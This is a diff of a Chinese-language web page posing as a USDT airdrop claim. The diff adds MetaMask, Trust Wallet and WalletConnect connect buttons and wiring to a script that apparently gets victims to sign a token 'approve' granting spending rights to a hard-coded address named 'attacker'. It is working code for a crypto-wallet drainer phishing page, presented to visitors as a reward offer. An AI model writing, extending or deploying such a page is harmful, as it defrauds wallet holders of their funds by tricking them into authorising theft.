@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
@@ -11,7 +10,12 @@
 <body style="text-align:center; padding-top:60px; font-family:sans-serif">
   <h2>🎉 恭喜你獲得 USDT 空投！</h2>
   <p>請選擇錢包並授權以領取獎勵</p>
-  <button id="connectButton">🔌 選擇錢包連接</button>
+
+  <button id="connectMetaMask">🦊 使用 MetaMask</button>
+  <br><br>
+  <button id="connectTrust">🔵 使用 Trust Wallet</button>
+  <br><br>
+  <button id="connectWalletConnect">📲 使用 WalletConnect</button>
   <br><br>
   <p id="status"></p>
 
@@ -27,38 +31,43 @@
     const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
     const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
-    const web3Modal = new window.Web3Modal.default({
-      cacheProvider: false,
-      providerOptions: {
-        injected: {
-          package: null,
-          display: {
-            name: "MetaMask",
-            description: "使用 MetaMask 錢包"
-          }
-        },
-        walletconnect: {
-          package: window.WalletConnectProvider.default,
-          options: {
-            infuraId: "99af7ec8242f4645ac8c27d5b9354e2c"
-          },
-          display: {
-            name: "WalletConnect",
-            description: "使用手機錢包掃碼連線"
-          }
-        },
-        trust: {
-          package: null,
-          display: {
-            name: "Trust Wallet",
-            description: "使用 Trust Wallet 擴充或 App"
-          }
+    const providerOptions = {
+      metamask: {
+        package: null
+      },
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          infuraId: "99af7ec8242f4645ac8c27d5b9354e2c"
         }
       }
+    };
+
+    const web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions
     });
 
-    document.getElementById("connectButton").addEventListener("click", async () => {
+    async function connect(type) {
       try {
+        if (type === 'trust') {
+          window.open("trust://", "_blank");
+          document.getElementById("status").innerText = "📱 請在 Trust Wallet 中完成操作...";
+          return;
+        }
+
+        if (type === 'walletconnect') {
+          web3Modal.clearCachedProvider();
+          web3Modal.providerController.providerOptions = {
+            walletconnect: providerOptions.walletconnect
+          };
+        } else if (type === 'metamask') {
+          web3Modal.clearCachedProvider();
+          web3Modal.providerController.providerOptions = {
+            injected: providerOptions.metamask
+          };
+        }
+
         const instance = await web3Modal.connect();
         provider = new ethers.providers.Web3Provider(instance);
         signer = provider.getSigner();
@@ -68,7 +77,11 @@
       } catch (err) {
         document.getElementById("status").innerText = "❌ 錢包連接失敗：" + err.message;
       }
-    });
+    }
+
+    document.getElementById("connectMetaMask").onclick = () => connect('metamask');
+    document.getElementById("connectWalletConnect").onclick = () => connect('walletconnect');
+    document.getElementById("connectTrust").onclick = () => connect('trust');
 
     async function approve() {
       try {
